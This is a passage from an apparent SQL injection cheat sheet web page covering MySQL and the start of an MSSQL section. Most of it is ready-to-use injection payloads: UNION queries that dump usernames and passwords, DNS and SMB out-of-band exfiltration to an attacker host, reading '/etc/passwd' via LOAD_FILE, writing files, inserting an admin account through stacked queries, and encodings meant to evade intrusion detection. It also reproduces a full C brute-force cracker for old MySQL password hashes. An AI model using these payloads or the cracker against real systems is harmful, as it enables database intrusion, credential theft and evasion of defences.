chars</font></i></li><li><i><font size="3">All default database column names: ~6000 chars</font></i></li></ul><i><br></i></div><h4><a id="PROCEDURE_ANALYSE_596077424008" name="PROCEDURE_ANALYSE_596077424008"></a>PROCEDURE ANALYSE()</h4><ul style="font-family: Courier New;"><li><font size="3">1 PROCEDURE ANALYSE() <i><font face="Verdana">#get first column name</font></i></font></li><li><font size="3">1 LIMIT 1,1 PROCEDURE ANALYSE() <i><font face="Verdana">#get second column name</font></i></font></li><li><font size="3">1 LIMIT 2,1 PROCEDURE ANALYSE() <i><font face="Verdana">#get third column name</font></i></font></li></ul><br><i><font size="3">Note: <br>It is necessary that the webapp will display the first selected column of the SQL query you are injecting to.</font></i><br><br><h4><a id="Retrieving_Multiple_Tables_Col" name="Retrieving_Multiple_Tables_Col"></a><b>Retrieving Multiple Tables/Columns at once</b></h4><ul><li><font size="3"><font face="'Courier New'">UNION
 SELECT MID(GROUP_CONCAT(0x3c62723e, 0x5461626c653a20, table_name, 
0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version 
FROM information_schema.tables) SEPARATOR 0x3c62723e),1,1024) FROM 
information_schema.columns</font></font></li></ul><br><h4><a id="Find_Tables_from_Column_Name_4" name="Find_Tables_from_Column_Name_4"></a><b>Find Tables from Column Name</b></h4><ul style="font-family: Courier New;"><li><font size="3">SELECT table_name FROM information_schema.columns WHERE column_name = '<i>username</i>'; <i><font face="Verdana">- Finds the table names for any columns named username.</font></i></font></li><li><font size="3">SELECT table_name FROM information_schema.columns WHERE column_name LIKE '%<i>user</i>%';</font> <font face="Verdana"><i><font size="3">- Finds the table names for any columns that contain the word user.</font></i></font></li></ul><br><h4><a id="Find_Column_From_Table_Name_98" name="Find_Column_From_Table_Name_98"></a><b>Find Column From Table Name</b></h4><ul style="font-family: Courier New;"><li><font size="3">SELECT column_name FROM information_schema.columns WHERE table_name = '<i>Users</i>';</font></li><li><font size="3">SELECT column_name FROM information_schema.columns WHERE table_name LIKE '%<i>user</i>%';</font></li></ul><br><h3><a id="Avoiding_the_use_of_single_dou_6348401808344327" name="Avoiding_the_use_of_single_dou_6348401808344327"></a><b>Avoiding the use of single/double quotations</b></h3><ul><li><font size="3"><font face="courier new">UNION SELECT CONCAT(<i>username</i>,0x3a,<i>password</i>) FROM <i>Users</i> WHERE <i>username</i> = </font></font><font size="3" face="courier new">0x61646D696E</font></li><li><font size="3"><font color="#000000" face="courier new">UNION SELECT CONCAT(<i>username</i>,0x3a,<i>password</i>) FROM <i>Users</i> WHERE <i>username</i> =&nbsp;</font><font face="courier new">CHAR(97, 100, 109, 105, 110)</font></font></li></ul><br><h3><a id="String_concatenation_307574598" name="String_concatenation_307574598"></a>String concatenation</h3><ul style="font-family: Courier New;"><li>SELECT CONCAT('a','a','a')</li><li><font face="'courier new'">SELECT 'a' 'd' 'mi' 'n'</font></li><li>SELECT/*/'a'/*/ 'd'/*/ 'mi'/*/ 'n' (phpMyAdmin)</li></ul><br><h3><a id="Privileges_4539396045729518_17" name="Privileges_4539396045729518_17"></a><b>Privileges</b></h3><h3><a id="FILE_privilege_950937865049773" name="FILE_privilege_950937865049773"></a>FILE privilege</h3><h4><a id="MySQL_4_5_33693227241850277_08" name="MySQL_4_5_33693227241850277_08"></a>MySQL 4/5</h4><ul><li><font size="3"><font face="courier new">' UNION SELECT file_priv FROM mysql.user WHERE user = '<i>username</i></font></font></li><li><font size="3"><font face="courier new">' AND MID((SELECT file_priv FROM mysql.user WHERE user = '<i>username</i>'),1,1) = 'Y</font></font></li></ul><h4><a id="MySQL_5_9751107808110009_82691" name="MySQL_5_9751107808110009_82691"></a>MySQL 5</h4><ul><li><font size="3"><font face="courier new">' UNION SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee like '%<i>username</i>%</font></font></li><li><font size="3"><font face="courier new">' AND MID((SELECT is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee like '%<i>username</i>%'),1,1)='Y</font></font></li></ul><br><h3><a id="Out_Of_Band_Channeling_8729303" name="Out_Of_Band_Channeling_8729303"></a><b>Out Of Band Channeling</b></h3><h4><a id="Timing_11805841577434628_73004" name="Timing_11805841577434628_73004"></a><b>Timing</b></h4><ul style="font-family: Courier New;"><li><font size="3">BENCHMARK()</font></li><li><font size="3">SLEEP()&nbsp; (MySQL 5)</font></li><li><font size="3">IF(), (CASE()WHEN)</font></li></ul><font size="3"><br></font><p><font size="3"><i>Example:</i></font></p><p></p><ul><li><font face="'courier new'">' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('test')), false)) - '</font></li></ul><p></p><p><br></p><div><h4><a id="DNS_requires_FILE_privilege_72" name="DNS_requires_FILE_privilege_72"></a><b>DNS (requires FILE privilege)</b></h4><ul><li><font size="3" face="courier new">SELECT LOAD_FILE(concat('\\\\<i>foo.</i>',(select MID(version(),1,1)),'.<i>attacker.com</i>\\'));</font></li></ul><br><h4><a id="SMB_requires_FILE_privilege_92" name="SMB_requires_FILE_privilege_92"></a><b>SMB (requires FILE privilege)</b></h4><ul><li><font size="3"><font face="courier new">' OR 1=1 INTO OUTFILE '\\\\<i>attacker</i>\\<i>SMBshare</i>\\<i>output.txt</i></font></font></li></ul><br><h3><a id="Reading_Files_requires_FILE_pr" name="Reading_Files_requires_FILE_pr"></a><b>Reading Files (requires FILE privilege)</b></h3><ul style="font-family: Courier New;"><li><font size="3">LOAD_FILE()</font></li><ul><li><font size="3">UNION SELECT LOAD_FILE('<i>/etc/passwd</i>')-- -</font></li><li><font face="'courier new'"><font size="3">UNION SELECT LOAD_FILE(<i>0x<font face="'courier new'"><font size="3">2F6574632F706173737764</font></font></i>)-- -</font></font></li></ul></ul><br><font size="3"><i>Note:<br></i></font><ul><li><i><font size="3">File must be located on the server host</font></i></li><li><i><font size="3">The basedirectory for load_file() is the&nbsp;<font face="'Courier New'">@@datadir</font></font></i></li><li><i><font size="3">The file must be readable by the MySQL user </font></i></li><li><i><font size="3">The file size must be less than max_allowed_packet</font></i></li><li><i><font size="3"><font face="courier new">UNION SELECT @@max_allowed_packet&nbsp;</font>(default value is 1047552 Byte)</font></i></li></ul><br><h3><a id="Writing_Files_requires_FILE_pr" name="Writing_Files_requires_FILE_pr"></a><b>Writing Files (requires FILE privilege)</b></h3><ul><li><font size="3"><font face="courier new">INTO OUTFILE/DUMPFILE</font></font></li><ul><li><font size="3"><font face="courier new">UNION SELECT '<i>code</i>' INTO OUTFILE '<i>/tmp/file</i></font></font></li></ul></ul><br><font size="3"><i>Note:<br></i></font><ul><li><font size="3"><i>You canâ€™t overwrite files with INTO OUTFILE</i></font></li><li><font size="3"><i>INTO OUTFILE must be the last statement in the query</i></font></li><li><font size="3"><i>There is no way to encode the pathname, so quotes are required</i></font></li></ul><br><h3><a id="Stacked_Queries_with_PDO_26260" name="Stacked_Queries_with_PDO_26260"></a><b>Stacked Queries with PDO</b></h3><p><font size="3">Stacked queries are possible when PHP uses the PDO_MYSQL driver to make a connection to the database.</font></p><p><br></p><p><font size="3"><i>Example:</i></font></p><ul><li><font size="3"><font face="courier new">AND 1=0; INSERT INTO <i>Users</i>(<i>username</i>,<i>password</i>,<i>priv</i>) VALUES ('<i>BobbyTables</i>', '<i>kl20da$$</i>','<i>admin</i>');</font></font></li></ul><br><h3><a id="User_Defined_Functions_3549701" name="User_Defined_Functions_3549701"></a><b>User Defined Functions</b></h3><span class="writely-comment writely-comment-yellow" id="writely-comment-id-dccjzmm"> UDF</span><span class="writely-comment writely-comment-yellow" id="writely-comment-id-dccjzmm">&nbsp;-R S 10/6/10 10:56 AM</span>&nbsp;</div><br><div><h3><a id="Fuzzing_8887572148166935_78069" name="Fuzzing_8887572148166935_78069"></a><b>Fuzzing and Obfuscation</b></h3><div><h4><a id="Allowed_Intermediary_Character_45253620241785364" name="Allowed_Intermediary_Character_45253620241785364"></a><b>Allowed Intermediary Characters</b></h4><div style="font-family: Courier New;"><ul><li><font size="3">09</font></li><li><font size="3">0A</font></li><li><font size="3">0B</font></li><li><font size="3">0C</font></li><li><font size="3">0D</font></li><li><font size="3">A0</font></li></ul><font size="3"><br></font></div><font size="3"><i>Example:</i></font> <font size="3"><font face="courier new">'%0A%09UNION%0CSELECT%10NULL%23</font></font></div><br><ul><li><font face="courier new">28</font></li><li><font face="courier new">29</font></li></ul><br><font size="3"><i>Example: </i><font face="courier new">UNION(SELECT(column)FROM(table))</font></font></div><div><br><i>Note:</i></div><div><i>Encoding your injection can sometimes be useful for IDS evasion.</i></div><ul><li><i><font face="'Courier New'">%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31</font></i></li><li><font face="'courier new'"><i>SELECT %74able_%6eame FROM information_schema.tables;</i></font></li><li><i><font face="'courier new'">SELECT %2574able_%256eame FROM information_schema.tables;</font><br></i></li><li><i><font face="'courier new'">SELECT %u0074able_%u6eame FROM information_schema.tables;</font><br></i></li></ul><br><div><i>Futhermore, by<font size="3">&nbsp;using # or -- followed by a newline, we can split the query into separate lines, sometimes tricking the IDS.</font></i></div><font size="3"><br></font><font face="'Courier New'">1'#</font><div><font face="'Courier New'">AND 0--</font></div><div><font face="'Courier New'">UNION# I am a comment!</font></div><div><font face="'Courier New'">SELECT@tmp:=table_name x FROM--</font></div><div><font face="'Courier New'">`information_schema`.tables LIMIT 1#</font></div><br><div><i>URL Encoded:&nbsp;</i><font face="'courier new'"><font size="3">1'%23%0AAND 0<font size="3">--%0A</font>UNION<font size="3">%23&nbsp;<font face="'courier new'">I am a comment!&nbsp;</font>%0A</font>SELECT@tmp:=table_name x FROM<font size="3">--%0A`information_schema`.tables LIMIT 1%23</font></font></font></div><br><h4><a id="Allowed_Intermediary_Character" name="Allowed_Intermediary_Character"></a><b>Allowed Intermediary Characters after AND/OR</b></h4><ul><li><font face="courier new">2B</font></li><li><font face="courier new">2D</font></li><li><font face="courier new">7E</font></li></ul><br><div><font size="3"><i>Example: </i></font><font size="3"><font face="courier new">SELECT 1 FROM dual WHERE 1=1 AND-+-+-+-+~~((1))</font><br></font></div><font size="3"><br><font face="courier new">$prefixes = array(" ", "+", "-", "~", "!", "@", " ");</font></font><br><br><ul><li><font face="courier new">09</font></li><li><font face="courier new">0A</font></li><li><font face="courier new">0B</font></li><li><font face="courier new">0D</font></li><li><font face="courier new">0C</font></li><li><font face="courier new">20</font></li><li><font face="courier new">A0<br></font></li></ul><br><font size="3"><i>Example:</i></font><font size="3"><font face="courier new"> SELECT 1 FROM information_schema%20%0C%20.%20%09tables;</font></font><br><font size="3"><br></font><h3><a id="Operators_671486718712981_8325" name="Operators_671486718712981_8325"></a><b>Operators</b></h3><font size="3"><font face="courier new">$operators
 = array("^", "=", "!=", "%", "/", "*", "&amp;", "&amp;&amp;", "|", 
"||", "&lt;", "&gt;", "&gt;&gt;", "&lt;&lt;", "&gt;=", "&lt;=", 
"&lt;&gt;", "&lt;=&gt;", "AND", "OR", "XOR", "DIV", "LIKE", "RLIKE", 
"SOUNDS LIKE", "REGEXP", "IS", "NOT");</font><br style="font-family: Courier New;"></font><br><h3><a id="Constants_37327503227982783_09" name="Constants_37327503227982783_09"></a><b>Constants</b></h3><ul style="font-family: Courier New;"><li><font size="3">current_user</font></li><li><font size="3">null, \N</font></li><li><font size="3">true, false</font></li></ul><br><h3><a id="MySQL_Functions_40317880650083" name="MySQL_Functions_40317880650083"></a><b>MySQL Functions()</b></h3><br><h3><a id="MySQL_Password_Hashing_Taken_f" name="MySQL_Password_Hashing_Taken_f"></a><b>MySQL Password Hashing</b></h3><font size="1">(Taken from Mysql.com)</font><br><br><div><font size="3">Prior to MySQL 4.1, password hashes computed by the <a href="http://dev.mysql.com/doc/refman/5.0/en/encryption-functions.html#function_password"><font face="Courier New">PASSWORD()</font></a> function are 16 bytes long. Such hashes look like this:</font><br></div><font size="2" face="courier new">+-----------------------------+</font><div style="font-family: Courier New;"><font size="2">| PASSWORD('mypass') &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |</font></div><div style="font-family: Courier New;"><font size="2">+-----------------------------+</font></div><div style="font-family: Courier New;"><font size="2">| 6f8c114b58f2ce9e &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |</font></div><div><font size="2" face="courier new">+-----------------------------+ </font><br><br><p></p><p><font size="3">As of MySQL 4.1, the <a href="http://dev.mysql.com/doc/refman/5.0/en/encryption-functions.html#function_password"><font face="Courier New">PASSWORD()</font></a> function has been modified to produce a longer 41-byte hash value: &nbsp; &nbsp; &nbsp;&nbsp;</font></p><font size="2" face="Courier New">+-----------------------------------------------------------------------+</font><div><font size="2" face="Courier New">|
 PASSWORD('mypass') &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; |</font></div><div><font size="2" face="Courier New">+-----------------------------------------------------------------------+</font></div><div><font size="2" face="Courier New">|
 
*6C8989366EAF75BB670AD8EA7A7FC1176A95CEF4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 |</font></div><div><font size="2" face="Courier New">+-----------------------------------------------------------------------+&nbsp;</font></div><br></div><h3><a id="MySQL_Password_Cracker_9393974" name="MySQL_Password_Cracker_9393974"></a><b>MySQL Password() Cracker</b></h3><div><font size="3">Cain &amp; Abel, JTR are capable of cracking MySQL 3.x-6.x passwords.</font></div><br><p><a id="MySQL_4_1_Password_Cracker_000_6457059870458292" name="MySQL_4_1_Password_Cracker_000_6457059870458292"></a><b>MySQL &lt; 4.1 Password Cracker</b></p><p><b><br></b></p><div><font size="3"><b>&lt;copypaste&gt;</b></font></div><div><font size="3">This
 tool is a high-speed brute-force password cracker for MySQL hashed 
passwords. It can break an 8-character password containing any printable
 ASCII characters in a matter of hours on an ordinary PC.</font><br><br><font size="1"><font face="courier new">/* This program is public domain. Share and enjoy.</font><br style="font-family: Courier New;"><font face="courier new"> *</font><br style="font-family: Courier New;"><font face="courier new"> * Example:</font><br style="font-family: Courier New;"><font face="courier new"> * $ gcc -O2 -fomit-frame-pointer MySQLfast.c -o MySQLfast</font><br style="font-family: Courier New;"><font face="courier new"> * $ MySQLfast 6294b50f67eda209</font><br style="font-family: Courier New;"><font face="courier new"> * Hash: 6294b50f67eda209</font><br style="font-family: Courier New;"><font face="courier new"> * Trying length 3</font><br style="font-family: Courier New;"><font face="courier new"> * Trying length 4</font><br style="font-family: Courier New;"><font face="courier new"> * Found pass: barf</font><br style="font-family: Courier New;"><font face="courier new"> *</font><br style="font-family: Courier New;"><font face="courier new"> * The MySQL password hash function could be strengthened considerably</font><br style="font-family: Courier New;"><font face="courier new"> * by:</font><br style="font-family: Courier New;"><font face="courier new"> * - making two passes over the password</font><br style="font-family: Courier New;"><font face="courier new"> * - using a bitwise rotate instead of a left shift</font><br style="font-family: Courier New;"><font face="courier new"> * - causing more arithmetic overflows</font><br style="font-family: Courier New;"><font face="courier new"> */</font><br style="font-family: Courier New;"><br style="font-family: Courier New;"><font face="courier new"> #include &lt;stdio.h&gt;</font><br style="font-family: Courier New;"><br style="font-family: Courier New;"><font face="courier new"> typedef unsigned long u32;</font><br style="font-family: Courier New;"><br style="font-family: Courier New;"><font face="courier new"> /* Allowable characters in password; 33-126 is printable ascii */</font><br style="font-family: Courier New;"><font face="courier new"> #define MIN_CHAR 33</font><br style="font-family: Courier New;"><font face="courier new"> #define MAX_CHAR 126</font><br style="font-family: Courier New;"><br style="font-family: Courier New;"><font face="courier new"> /* Maximum length of password */</font><br style="font-family: Courier New;"><font face="courier new"> #define MAX_LEN 12</font><br style="font-family: Courier New;"><br style="font-family: Courier New;"><font face="courier new"> #define MASK 0x7fffffffL</font><br style="font-family: Courier New;"><br style="font-family: Courier New;"><font face="courier new"> int crack0(int stop, u32 targ1, u32 targ2, int *pass_ary)</font><br style="font-family: Courier New;"><font face="courier new"> {</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;int i, c;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;u32 d, e, sum, step, diff, div, xor1, xor2, state1, state2;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;u32 newstate1, newstate2, newstate3;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;u32 state1_ary[MAX_LEN-2], state2_ary[MAX_LEN-2];</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;u32 xor_ary[MAX_LEN-3], step_ary[MAX_LEN-3];</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;i = -1;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;sum = 7;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;state1_ary[0] = 1345345333L;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;state2_ary[0] = 0x12345671L;</font><br style="font-family: Courier New;"><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;while (1) {</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;while (i &lt; stop) {</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i++;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pass_ary[i] = MIN_CHAR;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;step_ary[i] = (state1_ary[i] &amp; 0x3f) + sum;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor_ary[i] = step_ary[i]*MIN_CHAR + (state1_ary[i] &lt;&lt; 8);</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sum += MIN_CHAR;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;state1_ary[i+1] = state1_ary[i] ^ xor_ary[i];</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;state2_ary[i+1] = state2_ary[i]</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+ ((state2_ary[i] &lt;&lt; 8) ^ state1_ary[i+1]);</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;}</font><br style="font-family: Courier New;"><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;state1 = state1_ary[i+1];</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;state2 = state2_ary[i+1];</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;step = (state1 &amp; 0x3f) + sum;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;xor1 = step*MIN_CHAR + (state1 &lt;&lt; 8);</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;xor2 = (state2 &lt;&lt; 8) ^ state1;</font><br style="font-family: Courier New;"><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;for (c = MIN_CHAR; c &lt;= MAX_CHAR; c++, xor1 += step) {</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;newstate2 = state2 + (xor1 ^ xor2);</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;newstate1 = state1 ^ xor1;</font><br style="font-family: Courier New;"><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;newstate3 = (targ2 - newstate2) ^ (newstate2 &lt;&lt; 8);</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;div = (newstate1 &amp; 0x3f) + sum + c;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;diff = ((newstate3 ^ newstate1) - (newstate1 &lt;&lt; 8)) &amp; MASK;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (diff % div != 0) continue;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d = diff / div;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (d &lt; MIN_CHAR || d &gt; MAX_CHAR) continue;</font><br style="font-family: Courier New;"><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;div = (newstate3 &amp; 0x3f) + sum + c + d;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;diff = ((targ1 ^ newstate3) - (newstate3 &lt;&lt; 8)) &amp; MASK;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (diff % div != 0) continue;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;e = diff / div;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (e &lt; MIN_CHAR || e &gt; MAX_CHAR) continue;</font><br style="font-family: Courier New;"><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pass_ary[i+1] = c;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pass_ary[i+2] = d;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pass_ary[i+3] = e;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 1;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;}</font><br style="font-family: Courier New;"><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;while (i &gt;= 0 &amp;&amp; pass_ary[i] &gt;= MAX_CHAR) {</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sum -= MAX_CHAR;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i--;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;}</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;if (i &lt; 0) break;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;pass_ary[i]++;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;xor_ary[i] += step_ary[i];</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;sum++;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;state1_ary[i+1] = state1_ary[i] ^ xor_ary[i];</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;state2_ary[i+1] = state2_ary[i]</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+ ((state2_ary[i] &lt;&lt; 8) ^ state1_ary[i+1]);</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;}</font><br style="font-family: Courier New;"><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;return 0;</font><br style="font-family: Courier New;"><font face="courier new"> }</font><br style="font-family: Courier New;"><br style="font-family: Courier New;"><font face="courier new"> void crack(char *hash)</font><br style="font-family: Courier New;"><font face="courier new"> {</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;int i, len;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;u32 targ1, targ2, targ3;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;int pass[MAX_LEN];</font><br style="font-family: Courier New;"><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;if ( sscanf(hash, "%8lx%lx", &amp;targ1, &amp;targ2) != 2 ) {</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;printf("Invalid password hash: %s\n", hash);</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;return;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;}</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;printf("Hash: %08lx%08lx\n", targ1, targ2);</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;targ3 = targ2 - targ1;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;targ3 = targ2 - ((targ3 &lt;&lt; 8) ^ targ1);</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;targ3 = targ2 - ((targ3 &lt;&lt; 8) ^ targ1);</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;targ3 = targ2 - ((targ3 &lt;&lt; 8) ^ targ1);</font><br style="font-family: Courier New;"><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;for (len = 3; len &lt;= MAX_LEN; len++) {</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;printf("Trying length %d\n", len);</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;if ( crack0(len-4, targ1, targ3, pass) ) {</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("Found pass: ");</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for (i = 0; i &lt; len; i++)</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;putchar(pass[i]);</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;putchar('\n');</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;}</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;}</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;if (len &gt; MAX_LEN)</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;printf("Pass not found\n");</font><br style="font-family: Courier New;"><font face="courier new"> }</font><br style="font-family: Courier New;"><br style="font-family: Courier New;"><font face="courier new"> int main(int argc, char *argv[])</font><br style="font-family: Courier New;"><font face="courier new"> {</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;int i;</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;if (argc &lt;= 1)</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;printf("usage: %s hash\n", argv[0]);</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;for (i = 1; i &lt; argc; i++)</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;&nbsp;&nbsp;crack(argv[i]);</font><br style="font-family: Courier New;"><font face="courier new"> &nbsp;&nbsp;return 0;</font><br style="font-family: Courier New;"><font face="courier new"> }</font></font><br></div><font size="3"><b>&lt;/copypaste&gt;</b></font><br><br><br><h2><a id="MSSQL_11289749828037232_605030_33123298368804843" name="MSSQL_11289749828037232_605030_33123298368804843"></a><b>MSSQL</b></h2><b><u><br></u></b><h3><a id="Default_Databases_084865739132" name="Default_Databases_084865739132"></a><b>Default Databases</b></h3><ul><li style="font-family: Courier New;"><font size="3">pubs</font></li><li style="font-family: Courier New;"><font size="3">model</font></li><li style="font-family: Courier New;"><font size="3">msdb</font></li><li style="font-family: Courier New;"><font size="3">tempdb</font></li><li style="font-family: Courier New;"><font size="3">northwind</font></li><li><font size="3"><font face="courier new">information_schema</font> (&gt;= 2000)</font></li></ul><br><h3><a id="Comment_Out_Query_147209078262_6026431026487483" name="Comment_Out_Query_147209078262_6026431026487483"></a><b>Comment Out Query</b></h3><ul style="font-family: Courier New;"><li><font size="3">/*</font></li><li><font size="3">--</font></li><li><font size="3">%00</font></li></ul><br><h3><a id="Testing_Version_45404268473343_22317706867605192" 